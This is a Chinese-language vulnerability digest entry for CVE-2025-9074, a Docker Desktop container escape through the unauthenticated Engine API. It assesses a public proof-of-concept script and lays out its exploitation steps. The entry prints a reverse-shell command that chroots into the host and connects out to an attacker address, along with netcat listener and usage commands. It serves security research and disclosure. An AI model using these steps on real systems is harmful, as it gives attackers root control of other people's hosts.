## CVE-2025-9074 - Docker Desktop (Windows, macOS) 容器逃逸 (Container Escape), 权限提升 (Privilege Escalation), 远程代码执行 (RCE), 未授权访问 (Unauthorized Access)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸 (Container Escape), 权限提升 (Privilege Escalation), 远程代码执行 (RCE), 未授权访问 (Unauthorized Access)

**影响应用:** Docker Desktop (Windows, macOS)

**危害等级:** 高危 (Critical)

**CVSS评分:** 9.3

**影响版本:** 受影响版本 < 4.44.3 (已在4.44.3及更高版本中修复)

**利用条件:** 本地运行的恶意Linux容器, 通过默认子网(192.168.65.7:2375)未经认证地访问Docker Engine API, 不依赖于Docker socket挂载或“Expose daemon”设置。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

对提供的PoC代码`exploit.sh`进行分析后，其投毒风险评估为低（10%）。该脚本的实现方式透明、简洁，完全使用Bash语言编写，并依赖`curl`和`grep`等标准的Linux命令行工具。代码中没有发现任何形式的代码混淆、动态加载可疑外部资源、使用`eval`函数执行未知代码，或者尝试窃取敏感信息的行为。脚本的核心逻辑是构建一个Docker API请求，创建一个特定配置的容器，并通过此容器建立一个反向shell。这个反向shell是漏洞利用的预期结果和攻击载荷，并非PoC代码本身所携带的额外恶意功能。换言之，PoC旨在“演示”如何利用漏洞来获得控制权，而不是在演示过程中暗藏其他恶意行为。PoC代码的结构和功能意图清晰，易于安全研究人员进行审查和理解。因此，用户在运行此PoC之前可以对其内容进行彻底的安全审计，从而将潜在的投毒风险降至最低。

**POC有效性分析**：
所提供的概念验证（PoC）代码 `exploit.sh` 是一个高效且功能齐全的脚本，它演示了 Docker Desktop 中的 CVE-2025-9074 漏洞。该漏洞允许本地运行的恶意 Linux 容器绕过隔离机制，未经授权访问 Docker Engine API，该 API 通常通过默认子网（192.168.65.7:2375）暴露。该脚本细致地自动化了漏洞利用链。它首先查询 Docker Engine API 以获取可用的镜像，然后构造并创建一个具有关键恶意配置的新 Docker 容器。具体来说，它将容器配置为 `Privileged: true`，将宿主机的文件系统 (`/`) 挂载到容器的 `/host` 目录，并设置 `NetworkMode: host`。最关键的是，容器的 `Cmd` 被精心构造以执行一个反向 shell：`chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`。此命令强制将容器的根目录切换到挂载的宿主机文件系统，然后建立一个交互式 shell 连接，回连到攻击者指定的 IP 地址和端口。该脚本随后启动容器，立即触发反向 shell，并授予攻击者对宿主系统的完全 root 权限。这展示了一个完整的容器逃逸，导致任意命令执行并最终实现宿主机的全面控制。PoC 的设计坚固可靠，除了标准的 shell 实用程序（`curl`、`grep`）之外，无需任何外部依赖，使其易于部署，并且在演示漏洞方面高度可靠。`readme.md` 也清晰地概述了其特性，包括零依赖和未经认证的利用。

**利用步骤**：
攻击者可以通过简单的两步完成利用。首先，攻击者需要在其控制的机器上设置一个监听器，等待反向shell连接。例如，可以使用`netcat`命令：`nc -lvnp <攻击者监听端口>`。在`exploit.sh`脚本中，这个端口对应`-p`参数。接下来，攻击者从恶意容器内部（或其他可以访问Docker Engine API的环境中）执行PoC脚本。脚本接受两个强制参数：攻击者的IP地址（`-l`）和监听端口（`-p`）。例如，执行命令：`./exploit.sh -l <攻击者IP地址> -p <攻击者监听端口>`。如果Docker API不在默认的`192.168.65.7:2375`，也可以通过在脚本名后直接提供目标IP和端口来指定，例如：`./exploit.sh <目标Docker API IP> <目标Docker API 端口> -l <攻击者IP地址> -p <攻击者监听端口>`。脚本会自动发现一个可用的Docker镜像（优先使用alpine），创建一个具有特权并挂载宿主机根目录的新容器，然后启动该容器。一旦容器成功启动，其内部执行的命令将尝试连接到攻击者的监听器，建立一个反向shell。如果连接成功，攻击者将立即在其`netcat`会话中获得一个交互式的宿主机root shell，从而完全控制受影响的Docker Desktop环境。



**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
